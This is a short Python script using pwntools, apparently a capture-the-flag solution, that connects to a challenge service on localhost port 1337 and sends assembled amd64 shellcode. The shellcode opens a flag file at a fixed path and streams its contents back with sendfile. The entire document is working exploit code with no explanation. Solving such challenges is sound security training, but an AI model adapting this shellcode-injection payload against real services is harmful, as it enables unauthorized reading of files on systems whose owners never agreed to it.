from pwn import *

#p=process("../dist/./chall")
p=remote("127.0.0.1","1337")
#gdb.attach(p)
context(os='linux',arch='amd64')
context.log_level='DEBUG'

payload=shellcraft.openat(-1,"/home/ctfuser/challenge/flag.txt")
payload+=shellcraft.sendfile(1,'rax',0,4096)

p.sendline(asm(payload))

p.interactive()
